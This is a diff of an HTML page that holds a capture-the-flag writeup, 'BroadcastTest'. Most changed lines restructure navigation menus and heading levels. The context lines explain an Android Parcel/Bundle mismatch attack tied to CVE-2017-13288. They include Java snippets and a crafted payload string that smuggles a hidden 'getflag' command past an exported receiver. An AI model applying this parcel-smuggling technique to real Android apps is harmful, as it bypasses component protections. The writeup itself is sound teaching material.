@@ -139,37 +139,17 @@
             
             <li class="nav-item dropdown d-sm-block d-md-none">
               <a class="nav-link dropdown-toggle" href="#" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
-                background
+                writeup
               </a>
               <div class="dropdown-menu" aria-labelledby="smallerscreenmenu">
-                
-              </div>
-            </li>
+                                <a class="dropdown-item" href="#background">background</a>
     
-            <li class="nav-item dropdown d-sm-block d-md-none">
-              <a class="nav-link dropdown-toggle" href="#" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
-                theory
-              </a>
-              <div class="dropdown-menu" aria-labelledby="smallerscreenmenu">
-                
-              </div>
-            </li>
+                <a class="dropdown-item" href="#theory">theory</a>
     
-            <li class="nav-item dropdown d-sm-block d-md-none">
-              <a class="nav-link dropdown-toggle" href="#" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
-                exploit
-              </a>
-              <div class="dropdown-menu" aria-labelledby="smallerscreenmenu">
-                
-              </div>
-            </li>
+                <a class="dropdown-item" href="#exploit">exploit</a>
     
-            <li class="nav-item dropdown d-sm-block d-md-none">
-              <a class="nav-link dropdown-toggle" href="#" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
-                other
-              </a>
-              <div class="dropdown-menu" aria-labelledby="smallerscreenmenu">
-                
+                <a class="dropdown-item" href="#other">other</a>
+    
               </div>
             </li>
     
@@ -189,52 +169,35 @@
           <a href="#submenu0" data-toggle="collapse" aria-expanded="false" class="list-group-item list-group-item-action flex-column align-items-start bg-dark">
             <div class="d-flex w-100 justify-content-start align-items-center font-weight-bold">
               <span class="fa fa-dashboard fa-fw mr-3"></span>
-              <span class="menu-collapsed">background</span>
+              <span class="menu-collapsed">writeup</span>
               <span class="submenu-icon ml-auto"></span>
             </div>
           </a>
           <div id="submenu0" class="collapse sidebar-submenu">
-            
-          </div>
+            <a href="#background" class="list-group-item list-group-item-action text-white bg-dark">
+              <span class="menu-collapsed">background</span>
+            </a>
     
-          <a href="#submenu1" data-toggle="collapse" aria-expanded="false" class="list-group-item list-group-item-action flex-column align-items-start bg-dark">
-            <div class="d-flex w-100 justify-content-start align-items-center font-weight-bold">
-              <span class="fa fa-dashboard fa-fw mr-3"></span>
+<a href="#theory" class="list-group-item list-group-item-action text-white bg-dark">
               <span class="menu-collapsed">theory</span>
-              <span class="submenu-icon ml-auto"></span>
-            </div>
-          </a>
-          <div id="submenu1" class="collapse sidebar-submenu">
-            
-          </div>
+            </a>
     
-          <a href="#submenu2" data-toggle="collapse" aria-expanded="false" class="list-group-item list-group-item-action flex-column align-items-start bg-dark">
-            <div class="d-flex w-100 justify-content-start align-items-center font-weight-bold">
-              <span class="fa fa-dashboard fa-fw mr-3"></span>
+<a href="#exploit" class="list-group-item list-group-item-action text-white bg-dark">
               <span class="menu-collapsed">exploit</span>
-              <span class="submenu-icon ml-auto"></span>
-            </div>
-          </a>
-          <div id="submenu2" class="collapse sidebar-submenu">
-            
-          </div>
+            </a>
     
-          <a href="#submenu3" data-toggle="collapse" aria-expanded="false" class="list-group-item list-group-item-action flex-column align-items-start bg-dark">
-            <div class="d-flex w-100 justify-content-start align-items-center font-weight-bold">
-              <span class="fa fa-dashboard fa-fw mr-3"></span>
+<a href="#other" class="list-group-item list-group-item-action text-white bg-dark">
               <span class="menu-collapsed">other</span>
-              <span class="submenu-icon ml-auto"></span>
-            </div>
-          </a>
-          <div id="submenu3" class="collapse sidebar-submenu">
-            
+            </a>
+    
           </div>
     
         </ul>
       </div>
       <div class="col-10 py-3">
         <article class="markdown-body"><h1 id="broadcasttest"><a class="header-link" href="#broadcasttest"></a>BroadcastTest</h1>
-<h2 id="background"><a class="header-link" href="#background"></a>background</h2>
+<h2 id="writeup"><a class="header-link" href="#writeup"></a>Writeup</h2>
+<h3 id="background"><a class="header-link" href="#background"></a>background</h3>
 <p>We reverse the apk and find out that we only have 4 classes: <code>MainActivity$Message</code>, <code>Receiver</code>1-3. and <code>MainActivity$Message</code> implement from Parcelable class.</p>
 <p><code>Receiver1</code> is exported. It receive global broadcast and send the bundle to <code>Receiver2</code>.</p>
 <p><code>Receiver2</code> and <code>Recevier3</code> isn&#39;t exported, so they can only receive broadcasts from this apk.</p>
@@ -245,7 +208,7 @@
 <li><code>Receiver3</code> check the &quot;command&quot;, assert value == &#39;getflag.</li>
 </ol>
 <p>I search the parcel and bundle then find <a href="https://www.ms509.com/2018/07/03/bundle-mismatch">this article</a> and CVE-2017-13288.</p>
-<h2 id="theory"><a class="header-link" href="#theory"></a>theory</h2>
+<h3 id="theory"><a class="header-link" href="#theory"></a>theory</h3>
 <p>Android can marshal an object by implementing from Parceable.
 The class must implement <code>writeToParcel</code> and <code>readFromParcel</code> method to describe how to marshal and unmarshal.
 Parcelable object needs to be taken by Bundle, which is a hashmap.
@@ -321,7 +284,7 @@ bundle.writeToParcel(testData, <span class="hljs-number">0</span>);
 <span class="hljs-keyword">byte</span>[] raw = testData.marshall();</code></pre><p class="img-container"><img src="./1.png" alt=""></p>
 <p><code>writeString</code>will put &#39;\0&#39; to the end of string. 
 PAD_SIZE will make the length of unit be the multipiles of 4.</p>
-<h2 id="exploit"><a class="header-link" href="#exploit"></a>Exploit</h2>
+<h3 id="exploit"><a class="header-link" href="#exploit"></a>Exploit</h3>
 <p><code>MainActivity$Message</code> is a class implementing from <code>Parceable</code>.
 There are two type-difference:</p>
 <ol class="list">
@@ -413,7 +376,7 @@ type=0 means <code>VAL_STRING</code>.</p>
 
         <span class="hljs-keyword">byte</span>[] raw = b.marshall();
         String output = Base64.encodeToString(raw, <span class="hljs-number">0</span>);
-        Log.i(<span class="hljs-string">&quot;test&quot;</span>, output);</code></pre><h2 id="other"><a class="header-link" href="#other"></a>Other</h2>
+        Log.i(<span class="hljs-string">&quot;test&quot;</span>, output);</code></pre><h3 id="other"><a class="header-link" href="#other"></a>Other</h3>
 <p>I use this payload1 in match:</p>
 <pre class="hljs"><code>a.writeString(<span class="hljs-string">&quot;\7\0command\0\0\0\7\0getflag\0&quot;</span>);
 a.writeInt(<span class="hljs-number">0</span>);<span class="hljs-comment">//fake_type</span>
